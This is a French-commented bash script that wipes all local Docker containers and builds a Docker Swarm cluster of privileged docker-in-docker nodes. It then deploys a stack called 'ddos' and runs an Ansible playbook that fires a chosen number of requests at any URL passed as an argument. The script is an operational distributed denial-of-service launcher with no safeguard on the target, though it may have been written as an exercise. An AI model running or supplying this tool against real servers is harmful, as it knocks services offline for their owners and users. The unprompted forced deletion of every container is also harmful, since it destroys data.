#!/bin/bash

# Supprimer tous les conteneurs
docker rm $(docker ps -a -q) -f

# Le host quitte le cluster
docker swarm leave --force

MANAGER=${1:-2}
WORKER=${2:-3}

# Couleurs
BLUE='\033[0;34m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NC='\033[0m' # No Color

#=========================
# Creating cluster members
#=========================
echo -e "${GREEN}### Creating $MANAGER managers${NC}"
for i in $(seq 2 "$MANAGER"); do
  docker run -d --privileged --name master-"${i}" --hostname=master-"${i}"   docker:dind
done

echo -e "${GREEN}### Creating $WORKER workers${NC}"
for i in $(seq 1 "$WORKER"); do
  docker run -d --privileged --name worker-"${i}" --hostname=worker-"${i}"  docker:dind
done

#===============
# Starting swarm
#===============
MANAGER_IP="172.17.0.1"
echo -e "${GREEN}### Initializing main master: localhost${NC}"
docker swarm init --advertise-addr "$MANAGER_IP"

# Get manager token
MANAGER_TOKEN=$(docker swarm join-token manager -q)

# Get worker token
WORKER_TOKEN=$(docker swarm join-token worker -q)

# Visualiser le cluster
docker run -ti -d -p 8080:8080 -v /var/run/docker.sock:/var/run/docker.sock dockersamples/visualizer
echo -e "${YELLOW}Pour visualiser votre cluster cliquez sur le lien ci-dessous:${NC}"
echo "http://localhost:8080"

echo -e "${YELLOW}Attente que les conteneurs se lancent correctement${NC}"
sleep 10

#=============================
# Adding managers to the swarm
#=============================
for i in $(seq 2 "$MANAGER"); do
  docker exec -it master-"${i}" sh -c "docker swarm join --token $MANAGER_TOKEN $MANAGER_IP:2377"
done

#============================
# Adding workers to the swarm
#============================
for i in $(seq 1 "$WORKER"); do
  docker exec -it worker-"${i}" sh -c "docker swarm join --token $WORKER_TOKEN $MANAGER_IP:2377"
done

# Récupérer le nom d'hôte
HOSTNAME=$(hostname)

# Mettre à jour les étiquettes des nœuds master
docker node update  --label-add ansible  "$HOSTNAME"


echo -e "${YELLOW}Lancement des services nécessaires pour le ddos${NC}"
docker stack deploy -c docker-compose.yml ddos

CONTAINER_NAME=$(docker ps --filter ancestor=shmahma/ansible:ddos -q)

echo -e "${YELLOW}Attente que les services se lancent correctement${NC}"
sleep 60

# Vérifier s'il y a suffisamment d'arguments pour exécuter Ansible
if [ $# -ge 4 ]; then
    # Exécuter la commande ansible-playbook avec les arguments
    NB_REQ=$3
    SERVER_URL=$4

    echo -e "${GREEN}Envoie de requete ...${NC}"
    docker exec -ti $CONTAINER_NAME sh -c "ansible-playbook ddos.yml --extra-vars 'nb_req=$NB_REQ url=$SERVER_URL'"

else
    echo -e "${YELLOW}Les arguments pour Ansible ne sont pas présents. La commande Ansible n'a pas été exécutée.${NC}"
fi
echo -e "${YELLOW}Pour envoyer d autre requete, tapez:${NC}"
echo -e "${BLUE}docker exec -ti $CONTAINER_NAME sh -c 'ansible-playbook ddos.yml --extra-vars 'nb_req=@REQ url=URL''${NC}"
